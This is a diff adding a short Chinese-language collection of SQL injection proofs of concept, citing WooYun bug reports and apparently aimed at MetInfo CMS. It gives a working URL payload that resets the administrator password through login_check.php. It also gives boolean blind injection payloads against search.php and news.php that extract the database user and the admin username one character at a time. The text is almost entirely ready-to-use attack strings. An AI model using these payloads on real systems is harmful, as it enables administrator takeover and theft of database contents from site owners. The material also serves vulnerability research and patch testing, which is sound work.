@@ -1,0 +1,25 @@
+【http://www.wooyun.org/bugs/wooyun-2015-0134479】
+
+漏洞文件：/admin/include/global.func.php 1456行save_met_cookie函数
+
+重置管理员密码：
+http://localhost/admin/login/login_check.php?met_cookie_filter[a]=a%27,admin_pass=md5(123456)+where+id=1;+%23--
+当然利用不止这些(⊙o⊙)哦，毕竟我们已经绕过了防御。
+
+-------------------------------------------------------------
+【http://www.wooyun.org/bugs/wooyun-2015-0119160】
+
+http://localhost/search/search.php?class1=2&class2=&class3=&searchtype=1&searchword=1&lang=cn
+
+Post提交：class1re=) and if(ascii(substr(user(),1,1))=114,1,0)#  
+有结果显示即说明user()表中第一个字段第一个字母的Ascii码为114（字母r） 
+>>>>114,111,111,116,64,108,111,99,97,108,104,111,115,116——>>root@localhost
+类似第二个字母  user(),2,1))=111,1,0#
+
+-------------------------------------------------------------
+【http://www.wooyun.org/bugs/wooyun-2010-0119166】
+
+http://localhost/news/news.php?lang=cn&class2=5&serch_sql=as a join met_admin_table as b where if(ascii(substr(b.admin_id,1,1))=97,1,0) limit 0,1-- sd&imgproduct=xxxx 
+有结果显示即说明字段admin_id第一个字母的Ascii码为97（字母a）
+>>>>97,100,109,105,110——>>admin
+类似第二个字母 b.admin_id,2,1))=100,1,0
